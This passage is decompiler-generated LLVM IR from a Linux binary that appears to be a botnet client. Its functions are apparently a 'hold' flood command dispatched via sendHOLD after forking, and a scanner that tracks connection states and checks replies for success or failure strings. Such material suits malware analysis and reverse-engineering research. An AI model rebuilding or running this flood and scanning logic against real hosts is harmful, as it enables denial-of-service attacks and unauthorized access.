  store i32 %v2_8051b5e, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8051b65 = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_80519fb, i32* %eax.global-to-local, align 4
  %v3_8051b73 = add i32 %v2_8051a5a, %v2_80519fb
  %v4_8051b73 = inttoptr i32 %v3_8051b73 to i32*
  %v5_8051b73 = load i32, i32* %v4_8051b73, align 8
  %v2_8051b78 = udiv i32 %v5_8051b73, 32
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_80519fb, i32* %eax.global-to-local, align 4
  %v5_8051b81 = load i32, i32* %v4_8051b73, align 8
  %v1_8051b84 = urem i32 %v5_8051b81, 32
  store i32 %v1_8051b84, i32* %eax.global-to-local, align 4
  %v0_8051b87 = load i32, i32* @ebp, align 4
  %v2_8051b87 = mul nuw nsw i32 %v2_8051b78, 4
  %v3_8051b87 = add nsw i32 %v2_8051b87, -188
  %v4_8051b87 = add i32 %v3_8051b87, %v0_8051b87
  %v5_8051b87 = inttoptr i32 %v4_8051b87 to i32*
  %v6_8051b87 = load i32, i32* %v5_8051b87, align 4
  %v9_8051b87 = shl i32 1, %v1_8051b84
  %v12_8051b87 = or i32 %v6_8051b87, %v9_8051b87
  store i32 %v12_8051b87, i32* %v5_8051b87, align 4
  store i32 0, i32* %stack_var_-200, align 4
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_80519fb, i32* %eax.global-to-local, align 4
  %v5_8051ba9 = load i32, i32* %v4_8051b73, align 8
  %v1_8051bac = add i32 %v5_8051ba9, 1
  store i32 %v1_8051bac, i32* %edx.global-to-local, align 4
  %v1_8051bb5 = load i32, i32* @esp, align 4
  %v2_8051bb5 = add i32 %v1_8051bb5, 16
  %v3_8051bb5 = inttoptr i32 %v2_8051bb5 to i32*
  store i32 %v2_8051baf, i32* %v3_8051bb5, align 4
  %v0_8051bb9 = load i32, i32* @esp, align 4
  %v1_8051bb9 = add i32 %v0_8051bb9, 12
  %v2_8051bb9 = inttoptr i32 %v1_8051bb9 to i32*
  store i32 0, i32* %v2_8051bb9, align 4
  store i32 %v2_8051b5e, i32* %eax.global-to-local, align 4
  %v1_8051bc7 = load i32, i32* @esp, align 4
  %v2_8051bc7 = add i32 %v1_8051bc7, 8
  %v3_8051bc7 = inttoptr i32 %v2_8051bc7 to i32*
  store i32 %v2_8051b5e, i32* %v3_8051bc7, align 4
  %v0_8051bcb = load i32, i32* @esp, align 4
  %v1_8051bcb = add i32 %v0_8051bcb, 4
  %v2_8051bcb = inttoptr i32 %v1_8051bcb to i32*
  store i32 0, i32* %v2_8051bcb, align 4
  %v0_8051bd3 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051bd3 = load i32, i32* @esp, align 4
  %v2_8051bd3 = inttoptr i32 %v1_8051bd3 to i32*
  store i32 %v0_8051bd3, i32* %v2_8051bd3, align 4
  %v0_8051bd6 = load i32, i32* %stack_var_-200, align 4
  %v2_8051bd6 = load i32, i32* %stack_var_-192, align 4
  %v5_8051bd6 = call i32 @__libc_select(i32 %v0_8051bd6, i32 10000, i32 %v2_8051bd6, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8051bd6, i32* %eax.global-to-local, align 4
  %v12_8051bde = icmp eq i32 %v5_8051bd6, 1
  %v1_8051be2 = icmp eq i1 %v12_8051bde, false
  br i1 %v1_8051be2, label %dec_label_pc_8051c5e, label %dec_label_pc_8051be4

dec_label_pc_8051be4:                             ; preds = %dec_label_pc_8051b54
  store i32 4, i32* %stack_var_-204, align 4
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_80519fb, i32* %eax.global-to-local, align 4
  %v5_8051bf4 = load i32, i32* %v4_8051b73, align 8
  store i32 %v5_8051bf4, i32* %edx.global-to-local, align 4
  %v1_8051bfd = load i32, i32* @esp, align 4
  %v2_8051bfd = add i32 %v1_8051bfd, 16
  %v3_8051bfd = inttoptr i32 %v2_8051bfd to i32*
  store i32 %v2_8051bf7, i32* %v3_8051bfd, align 4
  store i32 %v2_8051c01, i32* %eax.global-to-local, align 4
  %v1_8051c07 = load i32, i32* @esp, align 4
  %v2_8051c07 = add i32 %v1_8051c07, 12
  %v3_8051c07 = inttoptr i32 %v2_8051c07 to i32*
  store i32 %v2_8051c01, i32* %v3_8051c07, align 4
  %v0_8051c0b = load i32, i32* @esp, align 4
  %v1_8051c0b = add i32 %v0_8051c0b, 8
  %v2_8051c0b = inttoptr i32 %v1_8051c0b to i32*
  store i32 4, i32* %v2_8051c0b, align 4
  %v0_8051c13 = load i32, i32* @esp, align 4
  %v1_8051c13 = add i32 %v0_8051c13, 4
  %v2_8051c13 = inttoptr i32 %v1_8051c13 to i32*
  store i32 1, i32* %v2_8051c13, align 4
  %v0_8051c1b = load i32, i32* %edx.global-to-local, align 4
  %v1_8051c1b = load i32, i32* @esp, align 4
  %v2_8051c1b = inttoptr i32 %v1_8051c1b to i32*
  store i32 %v0_8051c1b, i32* %v2_8051c1b, align 4
  %v0_8051c1e = load i32, i32* %stack_var_-204, align 4
  %v1_8051c1e = call i32 @getsockopt(i32 %v0_8051c1e)
  %v3_8051c23 = load i32, i32* %stack_var_-208, align 4
  %v1_8051c29 = icmp eq i32 %v3_8051c23, 0
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_80519fb, i32* %eax.global-to-local, align 4
  br i1 %v1_8051c29, label %dec_label_pc_8051c4e, label %dec_label_pc_8051c2d

dec_label_pc_8051c2d:                             ; preds = %dec_label_pc_8051be4
  %v5_8051c33 = load i32, i32* %v4_8051b73, align 8
  store i32 %v5_8051c33, i32* %eax.global-to-local, align 4
  %v1_8051c36 = load i32, i32* @esp, align 4
  %v2_8051c36 = inttoptr i32 %v1_8051c36 to i32*
  store i32 %v5_8051c33, i32* %v2_8051c36, align 4
  %v0_8051c39 = load i32, i32* %stack_var_-204, align 4
  %v1_8051c39 = call i32 @close(i32 %v0_8051c39)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_80519fb, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_8051a5a, align 4
  br label %dec_label_pc_8051d35

dec_label_pc_8051c4e:                             ; preds = %dec_label_pc_8051be4
  store i8 2, i8* %v5_8051a5a, align 4
  br label %dec_label_pc_8051d35

dec_label_pc_8051c5e:                             ; preds = %dec_label_pc_8051b54
  %v13_8051c5e = icmp eq i32 %v5_8051bd6, -1
  %v1_8051c62 = icmp eq i1 %v13_8051c5e, false
  br i1 %v1_8051c62, label %dec_label_pc_8051d35, label %dec_label_pc_8051c68

dec_label_pc_8051c68:                             ; preds = %dec_label_pc_8051c5e
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_80519fb, i32* %eax.global-to-local, align 4
  %v5_8051c6e = load i32, i32* %v4_8051b73, align 8
  store i32 %v5_8051c6e, i32* %eax.global-to-local, align 4
  %v1_8051c71 = load i32, i32* @esp, align 4
  %v2_8051c71 = inttoptr i32 %v1_8051c71 to i32*
  store i32 %v5_8051c6e, i32* %v2_8051c71, align 4
  %v1_8051c74 = call i32 @close(i32 %v5_8051bd6)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_80519fb, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_8051a5a, align 4
  br label %dec_label_pc_8051d35

dec_label_pc_8051c89:                             ; preds = %dec_label_pc_8051a75
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_8051b5e, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8051c9a = call i8* @_memset(i8* %tmp32, i32 0, i32 32)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_80519fb, i32* %eax.global-to-local, align 4
  %v3_8051ca8 = add i32 %v2_8051a5a, %v2_80519fb
  %v4_8051ca8 = inttoptr i32 %v3_8051ca8 to i32*
  %v5_8051ca8 = load i32, i32* %v4_8051ca8, align 8
  %v2_8051cad = udiv i32 %v5_8051ca8, 32
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_80519fb, i32* %eax.global-to-local, align 4
  %v5_8051cb6 = load i32, i32* %v4_8051ca8, align 8
  %v1_8051cb9 = urem i32 %v5_8051cb6, 32
  store i32 %v1_8051cb9, i32* %eax.global-to-local, align 4
  %v0_8051cbc = load i32, i32* @ebp, align 4
  %v2_8051cbc = mul nuw nsw i32 %v2_8051cad, 4
  %v3_8051cbc = add nsw i32 %v2_8051cbc, -188
  %v4_8051cbc = add i32 %v3_8051cbc, %v0_8051cbc
  %v5_8051cbc = inttoptr i32 %v4_8051cbc to i32*
  %v6_8051cbc = load i32, i32* %v5_8051cbc, align 4
  %v9_8051cbc = shl i32 1, %v1_8051cb9
  %v12_8051cbc = or i32 %v6_8051cbc, %v9_8051cbc
  store i32 %v12_8051cbc, i32* %v5_8051cbc, align 4
  store i32 0, i32* %stack_var_-200, align 4
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_80519fb, i32* %eax.global-to-local, align 4
  %v5_8051cde = load i32, i32* %v4_8051ca8, align 8
  %v1_8051ce1 = add i32 %v5_8051cde, 1
  store i32 %v1_8051ce1, i32* %edx.global-to-local, align 4
  %v1_8051cea = load i32, i32* @esp, align 4
  %v2_8051cea = add i32 %v1_8051cea, 16
  %v3_8051cea = inttoptr i32 %v2_8051cea to i32*
  store i32 %v2_8051baf, i32* %v3_8051cea, align 4
  store i32 %v2_8051b5e, i32* %eax.global-to-local, align 4
  %v1_8051cf4 = load i32, i32* @esp, align 4
  %v2_8051cf4 = add i32 %v1_8051cf4, 12
  %v3_8051cf4 = inttoptr i32 %v2_8051cf4 to i32*
  store i32 %v2_8051b5e, i32* %v3_8051cf4, align 4
  %v0_8051cf8 = load i32, i32* @esp, align 4
  %v1_8051cf8 = add i32 %v0_8051cf8, 8
  %v2_8051cf8 = inttoptr i32 %v1_8051cf8 to i32*
  store i32 0, i32* %v2_8051cf8, align 4
  %v0_8051d00 = load i32, i32* @esp, align 4
  %v1_8051d00 = add i32 %v0_8051d00, 4
  %v2_8051d00 = inttoptr i32 %v1_8051d00 to i32*
  store i32 0, i32* %v2_8051d00, align 4
  %v0_8051d08 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051d08 = load i32, i32* @esp, align 4
  %v2_8051d08 = inttoptr i32 %v1_8051d08 to i32*
  store i32 %v0_8051d08, i32* %v2_8051d08, align 4
  %v0_8051d0b = load i32, i32* %stack_var_-200, align 4
  %v2_8051d0b = load i32, i32* %stack_var_-192, align 4
  %v5_8051d0b = call i32 @__libc_select(i32 %v0_8051d0b, i32 10000, i32 %v2_8051d0b, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8051d0b, i32* %eax.global-to-local, align 4
  %v4_8051d13 = icmp eq i32 %v5_8051d0b, 0
  br i1 %v4_8051d13, label %dec_label_pc_8051d35, label %dec_label_pc_8051d19

dec_label_pc_8051d19:                             ; preds = %dec_label_pc_8051c89
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_80519fb, i32* %eax.global-to-local, align 4
  %v5_8051d1f = load i32, i32* %v4_8051ca8, align 8
  store i32 %v5_8051d1f, i32* %eax.global-to-local, align 4
  %v1_8051d22 = load i32, i32* @esp, align 4
  %v2_8051d22 = inttoptr i32 %v1_8051d22 to i32*
  store i32 %v5_8051d1f, i32* %v2_8051d22, align 4
  %v1_8051d25 = call i32 @close(i32 %v5_8051d0b)
  store i32 %storemerge41, i32* %edx.global-to-local, align 4
  store i32 %v2_80519fb, i32* %eax.global-to-local, align 4
  store i8 0, i8* %v5_8051a5a, align 4
  br label %dec_label_pc_8051d35

dec_label_pc_8051d35:                             ; preds = %dec_label_pc_8051a82, %dec_label_pc_8051c89, %dec_label_pc_8051c5e, %dec_label_pc_8051c68, %dec_label_pc_8051c4e, %dec_label_pc_8051c2d, %dec_label_pc_8051b44, %dec_label_pc_8051b2e, %dec_label_pc_8051d19
  %v4_8051d35 = add nuw nsw i32 %storemerge41, 1
  store i32 %v4_8051d35, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_8051d35, %v2_8051978
  br i1 %exitcond, label %dec_label_pc_8051d44, label %dec_label_pc_8051a54

dec_label_pc_8051d44:                             ; preds = %dec_label_pc_8051d38.preheader, %dec_label_pc_8051d35, %dec_label_pc_80519b6
  %stack_var_-40.0 = phi i32 [ %tmp8, %dec_label_pc_80519b6 ], [ 0, %dec_label_pc_8051d38.preheader ], [ %v2_8051978, %dec_label_pc_8051d35 ]
  %v0_8051d44 = load i32, i32* @esp, align 4
  %v1_8051d44 = inttoptr i32 %v0_8051d44 to i32*
  store i32 0, i32* %v1_8051d44, align 4
  %v1_8051d4b = inttoptr i32 %stack_var_-40.0 to i32*
  %v2_8051d4b = call i32 @__GI_time(i32* %v1_8051d4b)
  store i32 %v2_8051d4b, i32* %eax.global-to-local, align 4
  %v5_8051d53 = icmp slt i32 %v2_8051d4b, %v5_8051a3d
  br i1 %v5_8051d53, label %dec_label_pc_8051d38.preheader, label %dec_label_pc_8051d59

dec_label_pc_8051d38.preheader:                   ; preds = %dec_label_pc_8051d44
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v16_8051d3b39, label %dec_label_pc_8051a54, label %dec_label_pc_8051d44

dec_label_pc_8051d59:                             ; preds = %dec_label_pc_8051d44, %entry
  %v0_8051d65 = phi i32 [ %v3_80519a8, %entry ], [ %v2_8051d4b, %dec_label_pc_8051d44 ]
  ret i32 %v0_8051d65

; uselistorder directives
  uselistorder i32 %v4_8051d35, { 1, 2, 0 }
  uselistorder i32 %v1_8051cb9, { 1, 0 }
  uselistorder i32 %v5_8051bd6, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8051b84, { 1, 0 }
  uselistorder i32* %v4_8051b73, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 %v7_8051a5a, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i8* %v5_8051a5a, { 1, 4, 3, 2, 0, 5 }
  uselistorder i32 %storemerge41, { 5, 15, 14, 13, 12, 11, 7, 6, 10, 9, 8, 4, 3, 2, 21, 20, 19, 18, 17, 16, 0, 1 }
  uselistorder i32 %v2_8051b5e, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %v2_8051a18, { 1, 0 }
  uselistorder i32 %v2_80519fb, { 20, 19, 18, 17, 0, 16, 12, 11, 15, 14, 13, 10, 9, 1, 8, 25, 24, 23, 22, 2, 21, 3, 7, 26, 6, 5, 4 }
  uselistorder i32 %v1_8051986, { 1, 0 }
  uselistorder i32 %v2_8051978, { 3, 2, 0, 1 }
  uselistorder i32 %v1_805196a, { 1, 0, 2 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-192, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-200, { 0, 2, 1, 3, 4 }
  uselistorder i32* %stack_var_-204, { 1, 0, 2, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 10, 9, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32* %eax.global-to-local, { 53, 1, 44, 0, 2, 3, 7, 4, 5, 6, 8, 9, 11, 10, 12, 13, 15, 16, 14, 17, 18, 22, 19, 20, 21, 23, 24, 26, 25, 29, 27, 28, 30, 31, 35, 32, 33, 34, 36, 37, 38, 39, 40, 41, 42, 43, 45, 47, 46, 48, 50, 49, 51, 52 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051d35, { 8, 1, 3, 2, 4, 5, 6, 7, 0 }
}

define i32 @hold(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v7_8051d71 = icmp sgt i32 %arg3, 2
  br i1 %v7_8051d71, label %dec_label_pc_8051d73, label %dec_label_pc_8051d87

dec_label_pc_8051d73:                             ; preds = %entry
  %v1_8051d76 = add i32 %arg4, 12
  %v1_8051d79 = inttoptr i32 %v1_8051d76 to i32*
  %v2_8051d79 = load i32, i32* %v1_8051d79, align 4
  %v1_8051d7e = call i32 @atol(i32 %v2_8051d79)
  %v2_8051d83 = icmp slt i32 %v1_8051d7e, 0
  %v1_8051d85 = icmp eq i1 %v2_8051d83, false
  br i1 %v1_8051d85, label %dec_label_pc_8051da3, label %dec_label_pc_8051d87

dec_label_pc_8051d87:                             ; preds = %entry, %dec_label_pc_8051d73
  %v3_8051d9c = call i32 @Send(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_806b128.252 to i32))
  br label %dec_label_pc_8051e20

dec_label_pc_8051da3:                             ; preds = %dec_label_pc_8051d73
  %v1_8051da9 = call i32 @mfork(i32 %arg2)
  %v1_8051dae = icmp eq i32 %v1_8051da9, 0
  %v1_8051db0 = icmp eq i1 %v1_8051dae, false
  br i1 %v1_8051db0, label %dec_label_pc_8051e20, label %dec_label_pc_8051db2

dec_label_pc_8051db2:                             ; preds = %dec_label_pc_8051da3
  %v1_8051db5 = add i32 %arg4, 8
  %v1_8051db8 = inttoptr i32 %v1_8051db5 to i32*
  %v1_8051dbd = add i32 %arg4, 4
  %v3_8051ddf = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_806b14c.253 to i32))
  %v2_8051dea = load i32, i32* %v1_8051d79, align 4
  %v1_8051def = call i32 @atol(i32 %v2_8051dea)
  store i32 %v1_8051def, i32* @ebx, align 4
  %v2_8051dfc = load i32, i32* %v1_8051db8, align 4
  %v1_8051e01 = call i32 @atol(i32 %v2_8051dfc)
  %v1_8051e0e = inttoptr i32 %v1_8051dbd to i32*
  %v2_8051e0e = load i32, i32* %v1_8051e0e, align 4
  %v0_8051e10 = load i32, i32* @ebx, align 4
  %v4_8051e1b = call i32 @sendHOLD(i32 %v2_8051e0e, i32 %v1_8051e01, i32 %v0_8051e10)
  br label %dec_label_pc_8051e20

dec_label_pc_8051e20:                             ; preds = %dec_label_pc_8051da3, %dec_label_pc_8051d87, %dec_label_pc_8051db2
  %v0_8051e25 = phi i32 [ %v1_8051da9, %dec_label_pc_8051da3 ], [ %v3_8051d9c, %dec_label_pc_8051d87 ], [ %v4_8051e1b, %dec_label_pc_8051db2 ]
  ret i32 %v0_8051e25

; uselistorder directives
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8051e20, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051d87, { 1, 0 }
}

define i32 @get_ipstate_host() local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v0_8051e26 = load i32, i32* @ebp, align 4
  %v1_8051e2f = add i32 %tmp1, 4
  %v2_8051e2f = inttoptr i32 %v1_8051e2f to i32*
  %v3_8051e2f = load i32, i32* %v2_8051e2f, align 4
  %v1_8051e3b = call i32 @__GI_inet_ntoa(i32 %v3_8051e2f)
  store i32 %v0_8051e26, i32* @ebp, align 4
  ret i32 %v1_8051e3b
}

define i32 @read_until_response(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8051e42 = load i32, i32* @ebp, align 4
  store i32 %v0_8051e42, i32* %stack_var_-4, align 4
  %v4_8051e42 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8051e42, i32* @ebp, align 4
  %v3_8051e5d = inttoptr i32 %tmp6 to i8*
  %v4_8051e5d = call i32 @__GI_memset(i8* %v3_8051e5d, i32 0, i32 %tmp9)
  %v4_8051e7d = call i32 @read_with_timeout(i32 %arg1, i32 %tmp4, i32 %tmp6, i32 %tmp9)
  %v2_8051e92 = inttoptr i32 %tmp1 to i32*
  %v3_8051e92 = call i32 @contains_string(i32 %tmp6, i32* %v2_8051e92)
  %v1_8051e97 = icmp ne i32 %v3_8051e92, 0
  %. = zext i1 %v1_8051e97 to i32
  %v2_8051eae = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051eae, i32* @ebp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 %tmp6, { 2, 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8051eb3 = load i32, i32* @edi, align 4
  store i32 %v0_8051eb3, i32* %stack_var_-8, align 4
  store i32 0, i32* %stack_var_-152, align 4
  %v2_8051ed7 = ptrtoint i32* %stack_var_-144 to i32
  %tmp18 = bitcast i32* %stack_var_-144 to i8*
  store i32 %v2_8051ed7, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8051ede = call i8* @_memset(i8* %tmp18, i32 0, i32 32)
  %v2_8051eeb = udiv i32 %arg1, 32
  %v1_8051ef1 = urem i32 %arg1, 32
  %v0_8051ef4 = load i32, i32* @ebp, align 4
  %v2_8051ef4 = mul nuw nsw i32 %v2_8051eeb, 4
  %v3_8051ef4 = add nsw i32 %v2_8051ef4, -140
  %v4_8051ef4 = add i32 %v3_8051ef4, %v0_8051ef4
  %v5_8051ef4 = inttoptr i32 %v4_8051ef4 to i32*
  %v6_8051ef4 = load i32, i32* %v5_8051ef4, align 4
  %v9_8051ef4 = shl i32 1, %v1_8051ef1
  %v12_8051ef4 = or i32 %v6_8051ef4, %v9_8051ef4
  store i32 %v12_8051ef4, i32* %v5_8051ef4, align 4
  %v1_8051eff = add i32 %arg1, 1
  %v4_8051f06 = ptrtoint i32* %stack_var_-152 to i32
  %v5_8051f27 = call i32 @__libc_select(i32 %v1_8051eff, i32 %v2_8051ed7, i32 0, i32 0, i32 %v4_8051f06)
  %tmp19 = icmp slt i32 %v5_8051f27, 1
  %tmp20 = icmp eq i1 %tmp19, false
  br i1 %tmp20, label %dec_label_pc_8051f3c, label %dec_label_pc_8051f63

dec_label_pc_8051f3c:                             ; preds = %entry
  %v4_8051f58 = call i32 @recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_8051f63

dec_label_pc_8051f63:                             ; preds = %entry, %dec_label_pc_8051f3c
  %storemerge = phi i32 [ %v4_8051f58, %dec_label_pc_8051f3c ], [ 0, %entry ]
  %v2_8051f6f = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051f6f, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8051f63, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = ptrtoint i32* %arg1 to i32
  %v4_8051f78 = icmp eq i32 %arg2, 0
  %v6_8051f78 = trunc i32 %arg2 to i8
  %v1_8051f7c = icmp eq i1 %v4_8051f78, false
  br i1 %v1_8051f7c, label %dec_label_pc_8051f8b, label %dec_label_pc_8051f7e

dec_label_pc_8051f7e:                             ; preds = %entry
  %v2_8051f81 = load i32, i32* %arg1, align 4
  %v1_8051f86 = call i32 @close(i32 %v2_8051f81)
  br label %dec_label_pc_8051f8b

dec_label_pc_8051f8b:                             ; preds = %entry, %dec_label_pc_8051f7e
  %v1_8051f8e = add i32 %tmp3, 16
  %v2_8051f8e = inttoptr i32 %v1_8051f8e to i32*
  store i32 0, i32* %v2_8051f8e, align 4
  %v3_8051f9d = add i32 %tmp3, 8
  %v4_8051f9d = inttoptr i32 %v3_8051f9d to i8*
  store i8 %v6_8051f78, i8* %v4_8051f9d, align 1
  %v1_8051fa3 = add i32 %tmp3, 28
  %v2_8051fa3 = inttoptr i32 %v1_8051fa3 to i32*
  %v3_8051fa3 = load i32, i32* %v2_8051fa3, align 4
  %v3_8051fb9 = inttoptr i32 %v3_8051fa3 to i8*
  %v4_8051fb9 = call i32 @__GI_memset(i8* %v3_8051fb9, i32 0, i32 1024)
  ret i32 %v4_8051fb9

; uselistorder directives
  uselistorder i32 %tmp3, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8051f8b, { 1, 0 }
}

define i32 @reset_ipstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8051fc0 = load i32, i32* @ebp, align 4
  store i32 %v0_8051fc0, i32* %stack_var_-4, align 4
  %v4_8051fc0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8051fc0, i32* @ebp, align 4
  %v2_8051fd4 = inttoptr i32 %arg1 to i32*
  %v3_8051fd4 = call i32 @advance_state(i32* %v2_8051fd4, i32 0)
  %v1_8051fdc = add i32 %arg1, 9
  %v2_8051fdc = inttoptr i32 %v1_8051fdc to i8*
  store i8 1, i8* %v2_8051fdc, align 1
  %v2_8051fe0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051fe0, i32* @ebp, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 %arg1, { 2, 1, 0 }
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8051fe2 = load i32, i32* @ebp, align 4
  store i32 %v0_8051fe2, i32* %stack_var_-4, align 4
  %v4_8051fe2 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8051fe2, i32* @ebp, align 4
  %v3_8051ff6 = call i32 @contains_string(i32 %arg1, i32* nonnull @global_var_8070d20)
  %v2_8051ffb = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051ffb, i32* @ebp, align 4
  ret i32 %v3_8051ff6

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8051ffd = load i32, i32* @ebp, align 4
  store i32 %v0_8051ffd, i32* %stack_var_-4, align 4
  %v4_8051ffd = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8051ffd, i32* @ebp, align 4
  %v4_8052011 = call i32 @contains_string(i32 %arg1, i32* bitcast ([8 x i8*]* @global_var_8070cc0.268 to i32*))
  %v2_8052016 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8052016, i32* @ebp, align 4
  ret i32 %v4_8052011

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8052018 = load i32, i32* @ebp, align 4
  store i32 %v0_8052018, i32* %stack_var_-4, align 4
  %v4_8052018 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8052018, i32* @ebp, align 4
  %v1_8052024 = call i32 @contains_success(i32 %arg1)
  %v1_8052029 = icmp eq i32 %v1_8052024, 0
  %v1_805202b = icmp eq i1 %v1_8052029, false
  br i1 %v1_805202b, label %dec_label_pc_805204c, label %dec_label_pc_805202d

dec_label_pc_805202d:                             ; preds = %entry
  %v1_8052033 = call i32 @contains_fail(i32 %arg1)
  %v1_8052038 = icmp ne i32 %v1_8052033, 0
  %. = zext i1 %v1_8052038 to i32
  br label %dec_label_pc_805204c

dec_label_pc_805204c:                             ; preds = %dec_label_pc_805202d, %entry
  %storemerge = phi i32 [ 1, %entry ], [ %., %dec_label_pc_805202d ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  br label %dec_label_pc_805206c

dec_label_pc_805206c:                             ; preds = %dec_label_pc_805206c, %entry
  %stack_var_-12.0 = phi i32 [ 0, %entry ], [ %v4_805206c, %dec_label_pc_805206c ]
  %v4_805206c = add i32 %stack_var_-12.0, 1
  %v2_8052072 = mul i32 %v4_805206c, 4
  %v5_8052075 = add i32 %v2_8052072, %tmp5
  %v1_8052078 = inttoptr i32 %v5_8052075 to i32*
  %v2_8052078 = load i32, i32* %v1_8052078, align 4
  %v1_805207a = icmp eq i32 %v2_8052078, 0
  %v1_805207c = icmp eq i1 %v1_805207a, false
  br i1 %v1_805207c, label %dec_label_pc_805206c, label %dec_label_pc_80520b1.preheader

dec_label_pc_80520b1.preheader:                   ; preds = %dec_label_pc_805206c
  %v2_805209c = inttoptr i32 %arg1 to i8*
  %v5_80520b717 = icmp sgt i32 %v4_805206c, 0
  br i1 %v5_80520b717, label %dec_label_pc_8052087, label %dec_label_pc_80520c0

dec_label_pc_8052087:                             ; preds = %dec_label_pc_80520b1.preheader, %dec_label_pc_80520ae
  %storemerge118 = phi i32 [ %v4_80520ae, %dec_label_pc_80520ae ], [ 0, %dec_label_pc_80520b1.preheader ]
  %v2_805208a = mul i32 %storemerge118, 4
  %v5_805208d = add i32 %v2_805208a, %tmp5
  %v1_8052090 = inttoptr i32 %v5_805208d to i32*
  %v2_8052090 = load i32, i32* %v1_8052090, align 4
  store i32 %arg1, i32* @eax, align 4
